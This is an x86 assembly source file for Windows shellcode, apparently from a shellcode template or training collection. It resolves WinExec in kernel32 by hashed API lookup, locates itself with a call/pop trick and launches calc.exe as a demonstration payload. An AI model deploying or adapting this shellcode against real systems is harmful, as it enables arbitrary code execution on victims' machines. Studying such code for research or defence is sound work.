[ORG 0]
[BITS 32]

entry:
  ; store context
  push ebx                      ; store ebx

  ; calculate entry address
  call calc_entry_addr          ; calculate the entry address
  flag_CEA:                     ; flag for calculate entry address

  ; clear the direction flag
  cld

  ; find "kernel32.dll, WinExec"
  push 0x61DA2999               ; set hash key
  push 0x0AE20914               ; set function hash
  call find_api                 ; try to find api address
  add esp, 2*4                  ; restore stack for arguments
  cmp eax, 0                    ; check target function is found
  jz not_found                  ;

  ; ensure stack is 16 bytes aligned
  push edi                      ; store edi
  mov edi, esp                  ; store current to edi
  and edi, 0xF                  ; calculate the offset
  sub esp, edi                  ; adjust current stack

  ; call WinExec
  xor ecx, ecx                  ; clear ecx
  mov cl, [ebx+cmd_show]        ; set uCmdShow
  push ecx                      ; store uCmdShow
  lea ecx, [ebx+command]        ; calculate lpCmdLine
  push ecx                      ; store lpCmdLine
  call eax                      ; call api function
  ; add esp, 2*4                ; restore stack for arguments

  ; restore aligned stack
  add esp, edi                  ; restore stack from edi
  pop edi                       ; restore edi

  not_found:                    ;
  ; restore context
  pop ebx                       ; restore ebx
  ret                           ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop eax                       ; get return address
  lea ebx, [eax-flag_CEA]       ; calculate entry address.
  push eax                      ; push return address
  ret                           ; return to entry

hash_api:
  %include "../../../src/x86/find_api.asm"

command:
  db "calc.exe", 0

cmd_show:
  db 1
